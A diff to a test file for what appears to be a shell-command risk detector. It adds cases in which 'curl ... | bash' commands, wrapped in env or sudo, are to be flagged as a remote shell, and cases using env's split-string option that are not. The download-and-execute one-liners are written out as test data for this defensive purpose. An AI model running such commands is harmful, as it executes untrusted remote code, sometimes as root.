@@ -49,6 +49,10 @@ describe("a command that downloads a script and runs it is a remote shell howeve
     // a long option whose value is the next word
     `curl -s ${URL} | sudo --user root bash`,
     `curl -s ${URL} | env --unset FOO bash`,
+    // a wrapper by path with options, and wrappers chained
+    `curl -fsSL ${URL} | /usr/bin/env -i bash`,
+    `curl -fsSL ${URL} | /usr/bin/env FOO=1 bash`,
+    `curl -fsSL ${URL} | sudo env bash`,
   ]) {
     test(cmd, () => {
       const r = scoreOf(cmd);
@@ -73,6 +77,9 @@ describe("commands that do not run what they download are not", () => {
     `curl -s ${URL} | env grep bash`,
     `curl -s ${URL} | sudo -u root grep bash`,
     `curl -s ${URL} | sudo --user root grep bash`,
+    // env's split string is the command: here grep, with "bash" a word inside it
+    `curl -s ${URL} | env --split-string 'grep bash'`,
+    `curl -s ${URL} | env -S 'grep bash'`,
   ]) {
     test(cmd, () => {
       expect(scoreOf(cmd).ids).not.toContain("remote-shell");
